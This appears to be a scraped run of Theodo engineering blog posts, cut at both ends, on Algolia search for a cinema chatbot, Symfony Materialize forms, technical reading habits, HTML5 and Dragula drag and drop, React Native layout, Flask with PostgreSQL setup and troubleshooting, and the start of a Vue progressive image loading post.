    '13:15': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488024900/VO',
    '17:30': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488040200/VO',
    '19:45': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488048300/VO',
    '22:00': 'https://tickets.allocine.fr/paris-le-brady/reserver/F191274/D1488056400/VO'
  },
  ""_geoloc"": {
    ""lat"": 48.883658,
    ""lng"": 2.327202
  }
}

Updating the data
Algolia provides clients for many languages which means you can work with the language of your choice.

I went with Javascript since my bot is developed in Javascript. Hence, I needed to install two Javascript packages and add the corresponding two lines on top of every .js file where I’ll use Algolia:
npm install --save algoliasearch
npm install --save algoliasearch-helper

const algoliasearch = require('algoliasearch');
const algoliasearchHelper = require('algoliasearch-helper');

Uploading fresh data
The clients allow for batch uploading of JSON arrays, which is quite convenient.
However two days of screenings are contained in a 3.4Mb JSON array, and batch uploading the entire array often timed-out.
A solution is to upload small chunks of 100 screenings. With asynchronous Javascript, uploading does not take more than 5 seconds.
const algoliaIndexName = 'cine_seances';
const algolia = algoliasearch(APP_ID, ADMIN_API_KEY, {
    timeout: 5000
});

const showtimes = require('./showtimes.json');
const _ = require('lodash');
const index = algolia.initIndex(algoliaIndexName)
_(showtimes).chunk(100).forEach((chunk) => {
  index.addObjects(chunk, function(err, content) {
    // ...
  });  
});

Deleting old data
Since the free plan can only contain two days worth of data, every upload of a new batch means clearing all the records currently held in the database before uploading new ones.
index.clearIndex(function(err, content) {
  // OMG TOTAL WIPEOUT 😱
  _(showtimes).chunk(100).forEach((chunk) => {
    index.addObjects(chunk, function(err, content) {
      // 💯
    });  
  });
});

Algolia Configuration
Once the data is in there, it’s very simple to select the fields that will be searchable through Algolia, and the order in which they should be displayed to the user. It all happens in the index dashboard at https://www.algolia.com/explorer#?index=cine_seances
Searchable Attributes

After experimenting a bit, I found out the following order for the attributes that were important in the search:
1) Postal code
2) Movie Title
3) City
4) Theater Name
All that is needed is to add the attributes through the interface and order them in the way I want them to be prioritized.
Enabling Geolocation 🌏
A key feature I needed in the bot was the ability for the users to send their location and discover screenings around them.
Facebook Messenger allows you to prompt the user for his location, which can be useful as a fallback when the user does not understand how to talk to your chatbot.
When no screening is found based on the query, the bot prompts the user to send its location instead.
And then getting the location back from the message:
if(event.message && event.message.attachments) {
    const attachment = event.message.attachments[0];
    if(attachment.type === 'location') {
        const location = {
          'latitude': attachment.payload.coordinates.lat,
          'longitude': attachment.payload.coordinates.long,
        }
    }
}

Enabling geolocation search is simple with Algolia as you only need to add a _geoloc field to your records and enable Geosearch in the Dashboard:
{
  ...
  ""_geoloc"": {
    ""lat"": 48.883658,
    ""lng"": 2.327202
  }
}


Then by adding a query parameter aroundLatLng, you will get the results sorted based on distance.
You even get the distance in meters to the cinema, which you can then display to the user.
algoliaHelper.setQueryParameter('getRankingInfo', true);
algoliaHelper.setQueryParameter('aroundLatLng', `${location.latitude},${location.longitude}`);

algoliaHelper.setQuery('').search();
algoliaHelper.on('result', (result) => {
  const hits = result.hits;
  console.log(`Closest result is ${hits[0]._rankingInfo.matchedGeoLocation.distance} meters away.`)
});

Custom Ranking ⭐
Since I also had the information about the movie ratings, I wanted the results to be displayed in an order based not only on the proximity, but also on the quality of the movie.
To do so I defined Custom Ranking Attributes just below the searchable-attributes in the console, and Algolia sorts it out by itself.

Faceting for Same Day Retrieval
After setting up the ordering of results, I wanted to retrieve only the screenings for the date of today.
To do so I used faceting which allows me to index a field with a limited number of discrete values to make them easily searchable.
By faceting the date field, I was able to query all the showtimes for today’s date.

this.algoliaParams = { facets: ['date'], hitsPerPage: 10 };
const algoliaHelper = algoliasearchHelper(this.algolia, this.algoliaIndexName, this.algoliaParams)

algoliaHelper.addFacetRefinement('date', today);
algoliaHelper.setQuery('La La Land').search();
algoliaHelper.on('result', (result) => {
  const hits = result.hits;
  console.log(`${hits.length} showtimes for La La Land today.`)
});

Typo Tolerance
With Algolia you can also fine tune typo-tolerance on every field: if it should be enabled or not, the minimum number of characters before accepting 1 or 2 typos, and if stop words should be removed for example.
For a more exhaustive list, scroll down to this section on your index page.

That’s it, folks!
In a few hours, I was able to get Algolia configured to perform complex queries on my dataset and provide fast and relevant search to my users based on what their textual query as well as their location if they wish to share it.
 

I’d definitely recommend Algolia to anyone who wants to perform search on a slightly complicated dataset without the overhead of setting up an in-house solution.
However, getting more space and operation capacity comes at a cost: 49,9$/month for Starter Plan with 100’000 records and 1’000’000 operations. So you’d better have a product that makes money 💷

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jeremy Gotteland
  			
  				Full-Stack Developer @ TheodoUK in London. When I don't debug my code  with my rubber duck, you can find me coding useful (and less useful) products with loads of emojis.  			
  		
    
			

									"
"
										You want to make a nice, elegant and modern form using the new design standards of Material Design, I’ll try to give you a 5-minutes way to do so with Materialize, a JQuery library, based on these guidelines.
Get Started
Get the assets from Materialize and add it in web directory of your project following Symfony best practices : in fonts, Roboto, in CSS, materialize.min.css, in JS, materialize.min.js. Prefer minified version to improve loading performance.
Run assets:install command.
Import assets in your project templates
You need to import assets into your Twig. At the beginning of your base.html:
{% block stylesheets %}
  <link href=""{{ asset('css/materialize.css') }}"" rel=""stylesheet""/>
  <link href=""{{ asset('css/your_form_theme.css') }}"" rel=""stylesheet""/>
{% endblock %}
At the end of your base.html
{% block javascripts %}
  <script type=""text/javascript"" src=""https://code.jquery.com/jquery-2.1.1.min.js""></script>
  <script type=""text/javascript"" src=""{{ asset('js/materialize.min.js') }}""></script>
{% endblock %}
You need JQuery and materialize.min.js if you use Materialize Javascripts animations .
Create your Materialize form theme
Symfony use form themes to standardize display from components
You need to create your Materialize form theme to transform your form design from a basic to an elegant one. You can use this Gist I created for you. You need to create it into app/Ressources/views folder. Once it’s done, update your Twig configuration in app/config/config.yml:
twig:
  form_themes:
  - 'views/materialize_layout.html.twig'
And that’s it! You have built an elegant, modern and responsive form with very nice TextInputs, DatePicker or SelectList.

I look forward to reading your feedbacks and your suggestions or issues on the form theme repository.
Tips
You can update primary, secondary and background colors to adapt your form to your own visual identity by editing _variables.scss file in components folder. You’ll need Gulp to compile and minify CSS files.
Use grids of Materialize to display multiple fields on the same row depending on device width.
If you want to customise a specific form instead of all the forms of your app, follow the Symfony documentation and import your new form theme by adding this line at the beginning of the corresponding template:
{% form_theme form 'materialize_layout.html.twig'}

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Boutin
  			
  				Nicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  			
  		
    
			

									"
"
										Besides side projects, technical watch (reading articles, watching talks, listening to podcast) is the best way to discover new technologies, to learn useful technical tips, to improve your methodology and so on.
Technical Watch is like Devops: you have to be equipped to be efficient. The very first thing you should do to start is to install a tool like Pocket. With the app and the chrome extension you can stash and read articles everywhere.

Now, you have to find sources. Here are some examples, but feel free to ask around you what people are reading:

Download Materialistic which is the Hackernews app. You can screen the thirty first articles of the Catch Up section which gathers the most popular articles within the 24 hours. Same approach could be done with Reddit and once you’ve chosen your topics.


Create a Twitter account and follow the main contributor your favorite language or of a library you like. Follow the awesome speaker you saw at the last meetup or your colleague who always knows the new on-trend tool (see below). Or add my two favorite: Addy Osmani working on Google Chrome and the Dev.to blog. If someone pollutes your feed with a lot of useless information, don’t hesitate to get rid of him. A messy feed is an inefficient feed. 
Network with other developers : talk with your colleagues about their side-projects and enjoy meetups like HumanTalks to always discover new subjects or specialized meetup like ReactJS.
Read blogs from the major tech company like Airbnb, Github, Instagram, Uber… You can either follow their Twitter accounts or subscribe to their RSS feed.


Subscribe to technical newsletters like JS weekly or DevOps weekly.

Then you should create your own routine. Book 10 minutes each day to source content. For instance, I do that during breakfast. If it takes less than 30 seconds to read, read it now, if it takes longer stash it in our favorite app. Next find a daily slot to read the articles you’ve selected. The 20 minutes in the subway are much more useful since I’ve started this routine!
It’s important to regenerate your sources often otherwise the number of interesting articles will drop dramatically.
Thus, every two months, look at the list of people you’re following on Twitter, and remove the one whom you haven’t read a tweet within the month.
If you haven’t found any interesting articles on Hackernews since 15 days, switch to Reddit.
Finally if you want to look deeper into a specific subject, books could be your best ally. That’s how Benjamin, the CTO of Theodo, learnt how to code in Ruby and that’s how I’m learning how to work effectively with legacy code.
And what about you? I would be glad to learn what your tips are to do efficient technical watch!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Aurore Malherbes
  			
  				Web Developer at Theodo  			
  		
    
			

									"
"
										Drag & drop has become such a common feature on the web that people think it’s a no-brainer for developers. A few months back, a client told me: “How can it be that hard, it’s all over the internet!” and at that time I had no idea how to implement it. If you want to learn how it’s done, you are in the right place. Keep calm and read along!
Choose your technical approach
There are plenty open-source drag & drop libraries on the Internet. My advice is not to rush into the first library you find! You might spend a few days trying to tweak it only to realize it does not meet your project requirements.
That’s why the first part of this article is dedicated to drag & drop with HTML5, a sturdy and customizable solution which does not require you to install any external library. In the second part I will look into Dragula, a straightforward solution for reordering blocks on a web page, which comes with nice style features.
The demos are available here:

Drag & Drop with HTML5
Drag & Drop with Dragula and React
Drag & Drop with Dragula and Angular 1

A Sturdy Solution: Drag & Drop with HTML5 Attributes
Say you have two elements in your view: a draggable item and a drop zone.
<div> DRAGGABLE ITEM </div>
<div> DROP ZONE </div>

To make the first element draggable, add the draggable attribute:
<div draggable=""true""> DRAGGABLE ITEM </div>

By default nothing can be dropped into an element so the drop zone is not operational yet. Use the ondragover attribute to enable this behaviour:
<div ondragover=""allowDrop(event)""> DROP ZONE </div>
<script>
  allowDrop = (event) => {
    event.preventDefault();
  }
</script>

Use the ondrop attribute to decide what to do when the item is dropped on the zone. In the example below I log a message in the console:
<div ondragover=""allowDrop(event)"" ondrop=""handleDrop()""> DROP ZONE </div>
<script>
  allowDrop = (event) => {
    event.preventDefault();
  }
  handleDrop = () => {
    console.log('You dropped something!');
  }
</script>

That’s it! You now have basic drag & drop on your web page!
You can now add some extra features with the ondragstart, ondragenter and ondragleave attributes. For instance, a nice feature with ondragenter and ondragleave would be to highlight the drop zone by adding and removing a custom css class of your choice (named dragging-over in the example below). Here is the full code:
<div
  draggable=""true""
  ondragstart=""handleDragStart()"">
  DRAGGABLE ITEM
</div>
<div
  ondragover=""allowDrop(event)""
  ondrop=""handleDrop()""
  ondragenter=""colorize(this)""
  ondragleave=""uncolorize(this)"">
  DROP ZONE
</div>
<script>
  allowDrop = (event) => {
    event.preventDefault();
  }
  handleDragStart = () => {
    console.log('Started dragging');
  }
  colorize = (element) => {
    console.log('Entered the drop zone');
    element.classList.add('dragging-over');
  }
  uncolorize = (element) => {
    console.log('Left the drop zone');
    element.classList.remove('dragging-over');
  }
  handleDrop = () => {
    console.log('You dropped something!');
  }
</script>

Sometimes you don’t need to implement your own custom solution and a turnkey library can fit your project needs. Don’t reinvent the wheel if you don’t need to!
Reordering the DOM: introducing the Dragula library
Dragula lets you reorder elements of the DOM. In the following example I display the word “SMILE” and let the user move the letters around to form anagrams like “SLIME” or “MILES”.
The demo is coded with React but Dragula bridges are also available for Angular 1 and Angular 2.
As I am not using Webpack or any other tool to require Dragula, I use a <script> tag in the index.html file:
<html>
  <head>
    <meta charset=""UTF-8"" />
    <title>Drag & Drop - Dragula for React</title>
    <link rel=""stylesheet"" href=""style.css"">
    <link href=""bower_components/react-dragula/dist/dragula.min.css"" rel=""stylesheet"" type=""text/css"">
    <!-- Do not forget to import the Dragula style sheet -->
  </head>
  <body>
    <div id=""anagram""></div>
    <script src=""https://unpkg.com/react@latest/dist/react.js""></script>
    <script src=""https://unpkg.com/react-dom@latest/dist/react-dom.js""></script>
    <script src=""https://unpkg.com/babel-standalone@6.15.0/babel.min.js""></script>
    <!-- I use Babel to transform JSX to javascript -->
    <script src=""bower_components/react-dragula/dist/react-dragula.js""></script>
    <!-- I previously installed react-dragula with Bower -->
  </body>
</html>

Now let’s create a React component named Anagram and mount it on the div with the “anagram” id. Add a <script> tag to the body:
<script type=""text/babel"">
  class Anagram extends React.Component {
    render() {
      return <div className=""anagram-container"">
          <div className=""letter-outter-container"">
            <div className=""letter-container"">S</div>
          </div>
          <div className=""letter-outter-container"">
            <div className=""letter-container"">M</div>
          </div>
          <div className=""letter-outter-container"">
            <div className=""letter-container"">I</div>
          </div>
          <div className=""letter-outter-container"">
            <div className=""letter-container"">L</div>
          </div>
          <div className=""letter-outter-container"">
            <div className=""letter-container"">E</div>
          </div>
      </div>;
    }
  };
  ReactDOM.render(<Anagram/>, document.getElementById('anagram'));
</script>

The css classes letter-container and letter-outter-container are up to you. I wrapped the letter-container divs in order to get some spacing within letters without using margins because they generate glitches with Dragula. At this point I have something like this:

 
 
 
 
 
Finally, add the componentDidMount lifecycle method in the component and apply Dragula to the created DOM node:
componentDidMount() {
  var container = ReactDOM.findDOMNode(this);
  reactDragula([container]);
}

And there you go! You can now reorder the letters with drag & drop. You will also notice the very cool shadow image that indicates where the dragged element would be dropped. Dragula’s tagline is “Drag and Drop so simple it hurts”.
HTML5 vs Dragula

The one major drawback of the HTML5 DragEvent is that it is not compatible with touch devices. If you need to implement features for smartphones or tablets, have a look at the touchstart, touchmove and touchend events. They work pretty similarly!
As for Dragula, I definitely recommend it for DOM reordering features. It’s super-easy to use and once you know that glitches may occur with the margin and display: flex properties, everything should be okay.
You now have the tools to start coding pretty cool features with drag & drop! To go further you can check out the HTML Drag and Drop API, the Touch Events API and the Dragula options.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Louis Le Portz
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										The basics of positioning are pretty well explained in the official React Native documentation.
However, it only covers simple cases such as centering items or putting one element on top, middle and bottom.
Here I intend to cover some cases that are quite common but for which I couldn’t find a suitable documentation.
One item centered and one on the right, none on the left
N.B.: All of the following also works the other way around, or with top and bottom instead of left and right if you use flexDirection: column on the container.
If you know the width of the item on the right

export default class reactNativePositionning extends Component {
  render() {
    return (
      {/* Container */}
      <View style={{
        flexDirection: 'row',
        justifyContent: 'space-between',
      }}>
        {/* empty element on the left */}
        <View style={{ width: 100 }} />
        {/* element in the middle */}
        <View style={styles.box} />
        {/* element on the right */}
        <View style={[styles.box, { width: 100 }]} />
      </View>
    );
  }
}

const styles = StyleSheet.create({
  box: {
    backgroundColor: '#927412',
    height: 100,
    width:100,
  },
});

If you don’t know the width of the item on the right

If you don’t know the width of the element on the right, you can still wrap every item in another View.
Left and right wrappers will take all the available space, leaving the middle one centered.
The left wrapper will be empty.
export default class reactNativePositionning extends Component {
  render() {
    return (
      {/* Container */}
      <View style={{
        flexDirection: 'row',
        justifyContent: 'space-between',
      }}>

        {/*  empty wrapper */}
        <View style={{
          flexDirection: 'row',
          flex: 1,
        }} />

        {/* element in the middle */}
        <View style={{
          flexDirection: 'row',
          justifyContent: 'center',
        }}>
          <View style={styles.box} />
        </View>

        {/*  element on the right with a different size */}
        <View style={{
          flexDirection: 'row',
          flex: 1,
          justifyContent: 'flex-end',
        }}>
          <View style={[styles.box, { width: 22 }]} />
        </View>

      </View>
    );
  }
}

const styles = StyleSheet.create({
  box: {
    backgroundColor: '#927412',
    height: 100,
    width: 100,
  },
});

Grouping items

React native still misses margin: auto which is useful for grouping items – you can follow the state of the issue here.
Meanwhile what we can do is adding elements with a flex: 1 property to make them fill the space between blocks.
export default class reactNativePositionning extends Component {
  render() {
    return (
      {/* container */}
      <View style={{
        flexDirection: 'row',
        justifyContent: 'space-between',
      }}>
        {/* element on the left */}
        <View style={styles.box} />
        {/* space */}
        <View style={{ flex: 1 }} />
        {/* elements in the 'middle' */}
        <View style={styles.box} />
        <View style={styles.box} />
        {/* space */}
        <View style={{ flex: 1 }} />
        {/* elements on the right */}
        <View style={styles.box} />
        <View style={styles.box} />
      </View>
    );
  }
}

const styles = StyleSheet.create({
  box: {
    backgroundColor: '#927412',
    height: 50,
    marginLeft:2,
    marginRight:2,
    width:50,
  },
});

You can also add the property directly to your elements:
export default class reactNativePositionning extends Component {
  render() {
    return (
      {/* container */}
      <View style={{
        flexDirection: 'row',
        justifyContent: 'space-between',
      }}>
        {/* element on the left */}
        <View style={[styles.box], { flex: 1 }} />
        {/* elements in the 'middle' */}
        <View style={styles.box} />
        <View style={[styles.box], { flex: 1 }} />
        {/* elements on the right */}
        <View style={styles.box} />
        <View style={styles.box} />
      </View>
    );
  }
}


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
			

									"
"
										I have lately been attempting to develop a web app linked to a PostgreSQL database and despite all the tutorials available through the Internet, it has not been an easy task. So I have decided to gather all the sources or tips I have used to solve the errors I encountered and to provide with a boilerplate to help setting up a Flask app.
The objective of this post is to make it easier and faster for people to start using Flask and PostgreSQL.
If you have encountered any error in a related project please comment about it and explain how you solved it or provide any source that helped you.
By the end of this article you will, first, know that you are not alone encountering errors, second, find some answers to help you.
System
The code snippets have been tested with the following versions:

Flask 0.12
PostgreSQL 9.5
Python 2.7
Ubuntu 16.04

Please consider that when you reuse them.
What is needed to build the app?
Flask is a Python web developpement framework to build web applications. It comes with jinja2, a templating language for Python, and Werkzeug, a WSGI utility module.
PostgreSQL is an open source relational database system which, as its name suggests,
uses SQL.
SQLAlchemy is an Object Relational Mapper (ORM), it is a layer between
object oriented Python and the database schema of Postgres.
Alembic is a useful module to manage migrations with SQLAlchemy in Python. Migrations occur when one wants to change the database schema linked to the application, like adding a table or removing a column from a table. It can also be used to write or delete data in a table. Alembic enables developers not to manually upgrade their database and to easily revert any change: migrations go up and down. It is also useful to recreate databases from scratch, by following the migration flow.
Even if you don’t use them directly, you will have to install libpq-dev, to communicate with Postgres backend, and psycopg2, a libpq wrapper in Python.
So many things, but how to use each of them?
Now, let’s see how to connect the previous modules and software together. The good news is that almost everything is managed by itself.


Create an app.py file which will define and run the application. It is the entry point of the application. With Flask, it is as easy as importing the Flask class and initialize an instance with:
app = Flask(__name__)



Add:
if __name__ = '__main__':
    app.run()

in app.py file and then enter python app.py in a terminal to get your app running. Easy, but it does not do many things yet…


So far, if you want something else than an error 404 when accessing the application, create the first route which will return Hello World! at the root of the application. To do so, add the following piece of code after the definition of the application instance.
@app.route('/')
def main():
    return 'Hello World!'



Set the application in debug mode so that the server is reloaded on any code change and provides detailed error messages, otherwise it should be restarted manually. In app.py, before app.run():
app.config['DEBUG'] = True



Initialize a database object from Flask-Alchemy with db = SQLAlchemy() to control the SQLAlchemy integration to the Flask applications. You might put it directly in the app.py or in another file usually called models.py.
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

# define your models classes hereafter



Configure Flask by providing the PostgreSQL URI so that the app is able to connect to the database, through : app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://DB_USER:PASSWORD@HOST/DATABASE' where you have to replace all the parameters in capital letters (after postgresq://). Find out more on URI definition for PostgreSQL here.
Back in app.py:
POSTGRES = {
    'user': 'postgres',
    'pw': 'password',
    'db': 'my_database',
    'host': 'localhost',
    'port': '5432',
}
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\
%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES



You also have to connect your SQLAlchemy object to your application with db.init_app(app),
to make sure that connections will not leak. To do so, you first have to import db in app.py.
from models import db

# ...app config...
db.init_app(app)



Your models.py file should include the definition of classes which define the models of your database tables. Such classes inherit from the class db.Model where db is your SQLAlchemy object. Further, you may want to define models implementing custom methods, like an home-made __repr__ or a json method to format objects or export it to json. It could be helpful to define a base model which will lay the ground for all your other models:
class BaseModel(db.Model):
""""""Base data model for all objects""""""
__abstract__ = True
    # define here __repr__ and json methods or any common method
    # that you need for all your models

class YourModel(BaseModel):
""""""model for one of your table""""""
    __tablename__ = 'my_table'
    # define your model



Finally, you have to add a manage.py file to run database migrations and upgrades using flask_script and flask_migrate modules with:
from flask_script import Manager
from flask_migrate import Migrate, MigrateCommand
from app import app, db


manager = Manager(app)
migrate = Migrate(app, db)

manager.add_command('db', MigrateCommand)




You want to be abble to run the migrations command from the manager, these last lines are needed in manage.py:
if __name__ == '__main__':
    manager.run()



Installing PostgreSQL & code samples
Install Postgres and other requirements.
sudo apt-get update
sudo apt-get install postgresql postgresql-contrib libpq-dev
pip install psycopg2 Flask-SQLAlchemy Flask-Migrate

Optionnaly, if you want to modify some parameters in postgres, like the password of the user:
sudo -i -u postgres psql
postgres=# ALTER USER postgres WITH ENCRYPTED PASSWORD 'password';

Then, still in psql, create a database “my_database”:
postgres=# CREATE DATABASE my_database;

Here is what your code could look like, the previous paragraphs should enable you to understand the role of each line, and even better you should be able to modify it without breaking your app 😉 e.g. if you prefer defining your db object in app.py.
Overall, your application folder should look like:
    application_folder
    ├─ app.py
    ├─ manage.py
    └─ models.py

app.py file, used to run the app and connect the database to it.
from flask import Flask
from models import db

app = Flask(__name__)

POSTGRES = {
    'user': 'postgres',
    'pw': 'password',
    'db': 'my_database',
    'host': 'localhost',
    'port': '5432',
}

app.config['DEBUG'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = 'postgresql://%(user)s:\
%(pw)s@%(host)s:%(port)s/%(db)s' % POSTGRES
db.init_app(app)

@app.route(""/"")
def main():
    return 'Hello World !'

if __name__ == '__main__':
    app.run()

models.py file to define tables models.
from flask_sqlalchemy import SQLAlchemy
import datetime

db = SQLAlchemy()

class BaseModel(db.Model):
    """"""Base data model for all objects""""""
    __abstract__ = True

    def __init__(self, *args):
        super().__init__(*args)

    def __repr__(self):
        """"""Define a base way to print models""""""
        return '%s(%s)' % (self.__class__.__name__, {
            column: value
            for column, value in self._to_dict().items()
        })

    def json(self):
        """"""
                Define a base way to jsonify models, dealing with datetime objects
        """"""
        return {
            column: value if not isinstance(value, datetime.date) else value.strftime('%Y-%m-%d')
            for column, value in self._to_dict().items()
        }


class Station(BaseModel, db.Model):
    """"""Model for the stations table""""""
    __tablename__ = 'stations'

    id = db.Column(db.Integer, primary_key = True)
    lat = db.Column(db.Float)
    lng = db.Column(db.Float)

manage.py file to run migrations.
from flask_script import Manager
from flask_migrate import Migrate, MigrateCommand
from app import app, db


migrate = Migrate(app, db)
manager = Manager(app)

manager.add_command('db', MigrateCommand)


if __name__ == '__main__':
    manager.run()

Finally, run database migrations and upgrades. In a terminal:

python manage.py db init
 This will create a folder called migrations with alembic.ini and env.py files and a sub-folder migrations which will include your future migrations. It has to be run only once.

python manage.py db migrate
 Generates a new migration in the migrations folder. The file is pre-filled based on the changes detected by alembic, edit the description message at the beginning of the file and make any change you want.

python manage.py db upgrade
 Implements the changes in the migration files in the database and updates the version of the migration in the alembic_version table.
Common Mistakes – and Some Solutions
Could not connect to server
sqlalchemy.exc.OperationalError: (psycopg2.OperationalError) could not 
  connect to server: Connection refused
Is the server running on host ""localhost"" (127.0.0.1) and accepting
TCP/IP connections on port 5432?

The previous error stands when the declared host is “localhost” and the port is “5432” but it could be anything else depending on your context. It’s likely your PostgreSQL server is not running or not allowing the chosen connection protocol. See PostgreSQL documentation about Client Connection Problems.


check that PostgreSQL server is running: ps -aux | grep ""[p]ostgres"" or service postgresql status


start it if needed: /etc/init.d/postgresql start or service postgresql start – more information in the documentation.


if needed, modify the the config file indicated in the output of ps -aux, likely /etc/postgresql/X.X/main/postgresql.conf where X.X is your PostgreSQL version, to accept TCP/IP connections. Set listen_addresses='localhost'.


and check the pg_hba.conf file in the same repository, to make sure connections from localhost are allowed.


restart PostgreSQL server: /etc/init.d/postgresql restart


No password supplied
OperationalError: fe_sendauth: no password supplied
To solve this issue, several options:


Change the uri of the database to something that does not require secured authentication, like : postgresql://database_name which changes the type of connection to the database.


Actually read the error message and provide a password, passing an empty string '' if your database user has no password will not work.


Modify the connection rights associated with your database user in postgres configuration file named pg_hba.conf lileky located in /etc/postgresql/X.X/main where X.X is your PostgreSQL version. Writing something like:


host  all  postgres  127.0.0.1  md5


Everything about the pg_hba.conf file here.


Class does not have a table or tablename specified
InvalidRequestError: Class does not have a table or tablename specified 
and does not inherit from an existing table-mapped class

This occurs when trying to define a base model. This is actually an abstract class, never instantiated as such but inherited, the parameter __abstract__ = True has to be set when defining the base model class so that SQLAlchemy does not try to create a table for this model as explained here.
class BaseModel(db.Model):
    __abstract__ = True

Error when calling metaclass bases
TypeError: Error when calling the metaclass bases
Cannot create a consistent method resolution order (MRO)

If you have created a base model (let’s call it BaseModel) which inherits from db.Model, and then use it to define other models which also inherit from db.Model, it is possible you mixed the inheritance order: BaseModel should be first and then db.Model so that the method resolution order is consistent and BaseModel methods are not overrided by db.Model methods which have previously been overrided by BaseModel methods. Find out more on stackoverflow.
Your class should begin with:
class YourModel(BaseModel, db.Model):

No application bound to current context
Application not registered on db instance and no application
  bound to the current context
You have to link the application and the database object using db.init_app(app) or db.app = app (or both). Find out more on stackoverflow or in this blog post by Piotr Banaszkiewicz.
Alembic states that there is nothing to migrate
If it appears that Alembic does not detect change despite the few lines you just added to your models, then make sure that you did not defined several SQLAlchemy object: there should be just one db instance (db = SQLAlchemy()) that you import in the other files.
Let’s say you wrote db = SQLAlchemy() in models.py, then in app.py you should have from models import db and nothing like a second db = SQLAlchemy()
Database is not up to date
alembic.util.exc.CommandError: Target database is not up to date.
Well, the last Alembic version available in the migrations/versions/ is not the one indicated in your database alembic_version table (created by Alembic). Run python manage.py db upgrade to implement the migrations changes in the database.
Some great resources

A ready to use Flask App starter kit by antkahn, to go further than linking an app and a database!
More on how to run migrations with Alembic on realpython.com
Tutorial on a Flask – MySQL app with a frontend on code.tutsplus.com by Jay.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Adrien Agnel
  			
  				Agile Web Developer at Theodo  			
  		
    
			

									"
"
										Quick summary of part 1
I’m quite fond of the way Medium displays its images while they’re loading.
At first they display a grey placeholder, then displays a small version of the image – something like 27×17 pixels.
The trick is that most browsers will blur a small image if it is streched out.
Finally, when the full-size image is downloaded, it replaces the small one. You can see a live demo of what I had done on this Codepen.
In this post I intend to make a component that is as close as possible to what Medium actually does, as it is explained on this excellent post by José M. Perez.
And I have also switched from Vue 1 to Vue 2 😉
Adding a placeholder behind the images
Let’s add the first element which we wait for the images to be loaded: a grey placeholder.

In our template we have 3 elements:

a grey placeholder that will be shown while the low-resolution version of the image is not loaded yet
a low-resolution image that will be shown streched out while the high-resolution is not loaded yet
a high-resolution image that will be displayed to the user

The javascript logic will set the sources of the images and display the right element depending on which images are already loaded.
To load the images we’ll use the mounted function of the component.
To set the “state” of the component, we’ll use a data called currentSrc that will be initialized to null and will take the value of the source of the image that should be displayed.
This far, the Vue component should look like this:
<template>
  <div v-show=""currentSrc === null"" class=""placeholder""></div>
  <img v-show=""currentSrc === hiResSrc"" :src=""lowResSrc""></img>
  <img v-show=""currentSrc === hiResSrc"" :src=""hiResSrc""></img>
</template>

<style scoped>
  img, .placeholder {
    height: 600px;
    width: 900px;
    position: absolute;
  }
  .placeholder {
    background-color: rgba(0,0,0,.05);
  }
</style>

<script>
  export default {
    props: [
      'hiResSrc',
      'loResSrc'
    ],
    data: function() {
      return {
        currentSrc: null // setting the attribute to null to display the placeholder
      }
    },
    mounted: function () {
      var loResImg, hiResImg, that, context;
      loResImg = new Image();
      hiResImg = new Image();
      that = this;

      loResImg.onload = function(){
        that.currentSrc = that.loResSrc; // setting the attribute to loResSrc to display the lo-res image
      }
      hiResImg.onload = function(){
        that.currentSrc = that.hiResSrc; // setting the attribute to hiResSrc to display the hi-res image
      }
      loResImg.src = that.loResSrc; // loading the lo-res image
      hiResImg.src = that.hiResSrc; // loading the hi-res image
    }
  }
</script>

Adding transitions

Then we need to add some transitions when the value of currentSrc changes.
To be more accurate, we want to fade-in/out every element as they appear/disappear.
Vue.js lets you handle CSS transitions in a pretty easy way by adding and removing classes.
As we have multiple elements to transition between we have to use a transition group:
<template>
  <transition-group name=""blur"" tag=""div"">
    <div v-show=""currentSrc === null"" key=""placeholder"" class=""placeholder blur-transition""></div>
    <img v-show=""currentSrc === loResSrc"" :src=""loResSrc"" key=""lo-res"" class=""blur-transition""></canvas>
    <img v-show=""currentSrc === hiResSrc"" :src=""hiResSrc"" key=""hi-res"" class=""blur-transition""></img>
  </transition-group>
</template>

Here is how Vue.js handles the transition when the value of currentSrc changes from null to loResSrc:

the ‘blur-leave’ class is added to the placeholder, thus triggering the transition for the placeholder
the ‘blur-enter’ class is added to the low resolution image
the placeholder is hidden and the image is shown
on the next frame, the ‘blur-enter’ and ‘blur-leave’ classes are removed, thus triggering the transition for the image

Knowing this we can make the following changes in our style:
<style scoped>
  img, .placeholder {
    height: 600px;
    width: 900px;
    position: absolute;
  }
  .placeholder {
    background-color: rgba(0,0,0,.05);
  }
  .blur-transition {
    transition: opacity linear .4s 0s;
    opacity: 1;
  }
  .blur-enter, .blur-leave {
    opacity: 0;
  }
</style>

That way the images and placeholders will fade in and out when they appear and disappear.
You can see a live demo here: http://codepen.io/zkilo/pen/wgdxWq.
Well, it looks good but there is a slight difference with what it actually looks like on Medium.
Can you spot it?
Using canvas
If you’ve looked well at the previous Codepen you may have found out a little issue.
